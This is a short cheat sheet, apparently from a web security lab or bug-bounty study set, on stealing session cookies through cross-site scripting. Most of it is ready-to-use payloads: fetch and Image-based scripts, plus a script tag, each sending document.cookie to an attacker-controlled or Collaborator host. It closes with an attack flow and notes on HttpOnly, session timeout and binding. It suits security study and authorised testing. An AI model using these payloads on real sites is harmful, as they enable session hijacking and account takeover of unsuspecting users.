# Cookie Exfiltration CheatSheet

## Goal

Steal victim session cookies using XSS.

---

# Basic Cookie Theft

```javascript
document.cookie
```

---

# Fetch Exfiltration

```javascript
fetch(
'https://attacker.com',
{
method:'POST',
body:document.cookie
}
)
```

---

# Image-Based Exfiltration

```javascript
new Image().src=
'https://attacker.com/?cookie='
+ document.cookie;
```

---

# Collaborator Payload

```html
<script>
fetch(
'https://COLLABORATOR.oastify.com',
{
method:'POST',
mode:'no-cors',
body:document.cookie
}
)
</script>
```

---

# Attack Flow

```text
Stored XSS
        ↓
Victim Visits Page
        ↓
document.cookie
        ↓
Attacker Server
        ↓
Session Hijack
```

---

# Limitations

## HttpOnly

```javascript
document.cookie
```

returns nothing useful.

---

## Session Timeout

Captured cookie may expire.

---

## Session Binding

Sessions may be tied to:

```text
IP
Device
Location
```

---

# Related Lab

```text
Lab26
```

---

# Bug Bounty Reminder

Always check:

```text
HttpOnly
Secure
SameSite
```

before reporting cookie theft impact.